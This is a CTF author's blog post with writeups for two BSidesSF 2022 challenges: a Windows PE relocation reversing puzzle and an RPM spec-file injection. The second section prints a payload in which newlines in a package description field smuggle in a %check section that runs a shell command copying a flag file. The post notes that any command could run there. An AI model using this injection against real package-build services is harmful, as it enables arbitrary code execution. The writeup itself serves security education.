---
id: 2632
title: 'BSidesSF 2022 Writeups: Miscellaneous Challenges (loca, reallyprettymundane)'
date: '2022-06-17T15:19:23-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=2632'
permalink: /2022/bsidessf-2022-writeups-miscellaneous-challenges-loca-reallyprettymundane
categories:
    - 'BSidesSF 2022'
    - CTFs
---

Hey folks,

This is my (Ron's / iagox86's) author writeups for the BSides San Francisco 2022 CTF. You can get the full source code for everything [on github](https://github.com/bsidessf/ctf-2022-release). Most have either a Dockerfile or instructions on how to run locally. Enjoy!

Here are the four BSidesSF CTF blogs:

- [shurdles1/2/3, loadit1/2/3, polyglot, and not-for-taking](https://blog.skullsecurity.org/2022/bsidessf-2022-writeups-tutorial-challenges-shurdles-loadit-polyglot-nft)
- [mod\_ctfauth, refreshing](https://blog.skullsecurity.org/2022/bsidessf-2022-writeups-apache-challenges-mod_ctfauth-refresh)
- [turtle, guessme](https://blog.skullsecurity.org/2022/bsidessf-2022-writeups-game-y-challenges-turtle-guessme)
- [loca, reallyprettymundane](https://blog.skullsecurity.org/2022/bsidessf-2022-writeups-miscellaneous-challenges-loca-reallyprettymundane)

## Loca - A weird Windows reversing challenge

Several years ago, I wrote a challenge called [*launchcode*](https://blog.skullsecurity.org/2019/in-bsidessf-ctf-calc-exe-exploits-you-author-writeup-of-launchcode), where I backdoored `calc.exe` so it would detect a certain pattern of button presses and display a special message if it detects them (that in turn was based on a bug in Steam). But often, if I replaced certain bytes in the executable, it would mysteriously corrupt the code and crash! I eventually figured out it was due to "relocations", and I thought I'd make a challenge based on that.

This is where *[loca](https://github.com/BSidesSF/ctf-2022-release/tree/main/loca)* came from!

A Windows binary (ie, PE file) has a section called [`.reloc`, or relocation](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only). That section is essentially a big list (encoded in a weird, page-based DOS-ey feeling way) that lists every hardcoded memory address in the PE image.

When the Windows loader loads the PE image at an address where it doesn't want to be loaded to (which is always with ASLR), it will navigate that list and update each address in the loaded binary. It adds the difference between where it wants to be loaded and where it is actually loaded to the original value. That way, no matter where the image is loaded into memory, the hardcoded addresses will point to the right spot.

That's obviously a ridiculous way to handle relocations, but I'm sure there are pros and cons.

For this challenge, I calculate a simple request/response. The problem is that the initial value of the checksum I calculate is marked as a relocation, which means it changes based on where it's loaded. That means that for a solution, you need to:

- Realize it's relocating the seed address
- Leak a memory address using an information-disclosure issue
- Calculate the result for the current offset

All this has the bonus that it breaks debugging - debuggers disable ASLR, which means if you debug this executable you'll miss the trick entirely. I'm not sure if that's good or bad, because I had several people ask questions, but it certainly made it challenging!

## reallyprettymundane

*[reallyprettymundane](https://github.com/BSidesSF/ctf-2022-release/tree/main/reallyprettymundane)* is an RPM-spec-injection attack. It's based on something I found while investigating [CVE-2022-1388](https://attackerkb.com/topics/SN5WCzYO7W/cve-2022-1388/rapid7-analysis). Basically, if you can add newlines to an RPM's .spec file, you can run arbitrary code by adding a new section to the .spec. Some sections contain executable code, and that's what we care about!

For our [solution](https://github.com/BSidesSF/ctf-2022-release/blob/main/reallyprettymundane/solution/solve.rb), we target the `%check` section, which consists of shell commands. The solution is somewhat complex, because I didn't want to spawn a shell, but the bones of it is this form:

```
    :body => {
      :name        => 'name',
      :summary     => 'summary',
      :version     => 'hi',
      :release     => '2',

      # The payload is here - it copies the flag over top of the target filename
      :description => "description\n\n%check\n\ncp #{ FLAG_PATH } $RPM_BUILD_ROOT/name/#{ TARGET_FILE_NAME }*\n",

      'file'  => [t],
    }
```

Specifically, the description, which is:

```
description

%check

cp #{ FLAG_PATH } $RPM_BUILD_ROOT/name/#{ TARGET_FILE_NAME }*
```

You could run any shell command in there - the one I came up with copies the flag file into the folder that's being packaged up. That way, it sends me the flag and I don't have to deal with code execution!